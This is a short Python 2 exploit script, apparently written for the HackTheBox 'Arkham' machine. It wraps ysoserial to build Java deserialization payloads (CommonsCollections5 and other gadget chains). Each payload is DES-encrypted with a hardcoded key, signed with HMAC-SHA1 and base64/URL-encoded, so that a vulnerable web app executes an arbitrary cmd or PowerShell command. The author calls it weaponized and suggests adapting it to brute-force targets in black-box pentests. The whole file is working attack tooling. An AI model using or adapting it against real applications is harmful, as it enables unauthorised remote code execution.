'''
Here is a java payload generator python2 script inspired by : 

https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/

You need to download ysoserial: https://github.com/pimps/ysoserial-modified and make sure the .jar is in the same directory

I improved it and weaponized it to ease the process while attacking the "Arkham" machine on HackTheBox.
That's the reason it only offers to inject cmd or powershell commands, but this can be easily modified
Getting rid of some # will turn it into a java payloads generator to bruteforce a target when conducting a blackbox pentest
Just make sure to add/remove any extra round of encryption to adapt it to the targeted web app
Don't forget to modifiy the HMAC secret key

Farid
'''

import os
import base64
import hmac
import hashlib
import urllib
 
#payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']
payloads = ['CommonsCollections5']
name = 'Arkham' #input("File Name?\n")
cmd = input("Write the command you want to inject (between quotes)?\n")
shell = input("Would you like to use cmd or powershell (between quotes)?\n")

def generate(name, cmd, shell):
    for payload in payloads:
        print('Generating ' + payload + ' for ' + name + '...')
        command = os.popen('java -jar ysoserial-modified.jar ' + payload + ' ' + shell + ' \'' + cmd + '\' 2>/dev/null') 
        result = command.read()
        command.close()

        if result != "":
            # Encrypting the payload
            open('temp', 'wb').write(result)
            command2 = os.popen('openssl enc -des-ecb -K 4a7346393837362d -in temp')
            encrypted_payload = command2.read()
            command2.close()

            # Generating the hmac
            hash = hmac.new('JsF9876-', encrypted_payload, hashlib.sha1) # Secret key would be the first string in the parentheses
            digest = hash.digest()

            # Concatenating the encrypted payload and the hmac signature
            final_payload_raw = encrypted_payload + digest
            final_payload_b64 = base64.encodestring(final_payload_raw)

            thelastmeal = urllib.quote(final_payload_b64)
            print(thelastmeal)
            # If you want to write it to a file
            #open(payload + '_final.txt', 'w').write(thelastmeal)

generate(name, cmd, shell)
